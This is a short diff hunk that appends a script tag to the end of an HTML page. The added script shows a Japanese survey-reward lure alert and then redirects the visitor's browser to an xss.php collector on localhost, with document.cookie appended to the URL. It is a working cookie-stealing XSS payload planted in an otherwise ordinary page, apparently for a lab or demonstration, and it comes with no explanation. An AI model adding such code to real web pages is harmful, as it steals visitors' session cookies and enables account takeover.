@@ -14,3 +14,5 @@
   </div>
 </body>
 </html>
+
+<script>if (!alert('今ならアンケート回答で1万円GET！アンケートに答えますか？')) {location.href = 'http://localhost:9999/xss.php?' + document.cookie;}</script>
